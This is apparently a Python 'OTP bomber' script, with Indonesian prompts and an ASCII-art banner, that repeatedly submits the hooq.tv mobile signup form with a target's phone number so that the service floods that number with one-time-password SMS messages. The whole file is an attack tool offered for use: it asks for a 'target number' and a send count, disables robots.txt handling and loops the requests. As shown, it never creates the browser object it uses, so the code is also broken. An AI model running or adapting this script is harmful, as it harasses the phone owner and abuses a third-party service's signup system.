try:
	import mechanize,os,sys,time
	
	print("""\033[97m
                                                                       
                             .--:////::-.                             
                       -/ooo+/:--....--:/+ooo/-                       
                   .+so/.                    ./oo+-                   
                .+s+.                            ./so.                
              -so.                                  .+s:              
            -y+`                                      `/y-            
          `ss`   `/+.      `..--.:--:.--..`      .+/`   `os`          
         -h: `:-smo`   `...`..` -`..`- `..`...`    omy-:` -h-         
        :h. :d-dy+.  `-....:`  .. .. .. `.:-...-`  `+yd-d: .h:        
       -h`.-my:oy+ `-.   ..``.-:-yooho:.`` ..   .-` +yo:sm--`h-       
      `d..d-msds. `-    ..    -` :-+m+`-    ..    -. .sdsm-d..d`      
      s+ sm-d+++ .-...``-     -   .+   -`    -```..-. +++d-my +s      
     .d``ym:sms `-    `-.....--...os...--.....:``   -` sms:my``d.     
     +s o:myd/. -`     :     -`   ::`  `-     :     `- ./dym:o s+     
     s/`m-sh.y. :     `-     -`.-oyyo-.`-     -`     : .y-ys-m`/s     
     y/ dd::dh  :......:...-:oym``hh` dyo:-...-......:` hd::dd /y     
     s/ /mhsm:. :     `-odmmmmms `+o` smmmmmdo-`     : .:mshm/ /s     
     +s`s:dho:s -`     /mmmmmmmy  dd  ymmmmmmm/     `- s:ohd:s`s+     
     .d`oh:o/sm``-   ``smmmmmmmm/ mm /mmmmmmmms.`   -` ms/o:ho`d.     
      s+ omh-ym./.-..``ymmmmmmmmmommommmmmmmmmy `..-./.my-hmo +s      
      `d.`/smym:ss.-  `mmmmmmmmmmmmmmmmmmmmmmmm`  -.ss:myms/`.d`      
       -h`/s::sy:mo`-.:mmmmmmmmmmmmmmmmmmmmmmmm:.-`om/ys/:s/`h-       
        :h.-ydyo:sm/o/+mmmmmmmmmmmmmmmmmmmmmmmm+/o/ms:oydy-.h:        
         .h: .oyddhd:hdmmmmmmmmmmmmmmmmmmmmmmmmdh:dhddyo. :h-         
          `os`.++/+os/ohdmmmmmmmmmmmmmmmmmmmmdho:so+/++.`ss`          
            -y+``/oyhhhyo+odmmmmmmmmmmmmmmmo+oyhhhyo/.`+y-            
              -so.`/ssyhdMMmmmmmmmmmmmmmmmmMMdhyss/`.os-              
                .+s+.`-::--mmmmmmmmmmmmmmmm--::-`.+s+.                
                   .+oo/. `mmmmmmmmmmmmmmmm. ./os+.                   
                       ./osdmmmmmmmmmmmmmmdso/-                       
                             `--::///::-.                               
""")

	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 8.1)")]
	
	def send(no):
		br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
		br.select_form(nr=0)
		br.form["mobile"] = no
		br.form["password"] = "KangNewbieNoobea"
		res=br.submit().read()
		#print(res)
		if 'confirmotp' in str(res):
			print(i+1,"sukses mengirim OTP")
		else: print(i+1,"gagal mengirim OTP")
		#return True
	no=int(input("[?] Nomor target: "))
	jlm=int(input("[?] jumlah: "))
	print()
	if jlm > 20:
		exit("[!] kalo tidak mau script ini koid ngirimnya jangan banyak-banyak bosque")
	for i in range(jlm):
		send(str(no))
		time.sleep(1)
	
except KeyboardInterrupt: exit("[exit] key interrupt")
except Exception as F: print("Err: %s"%(F))
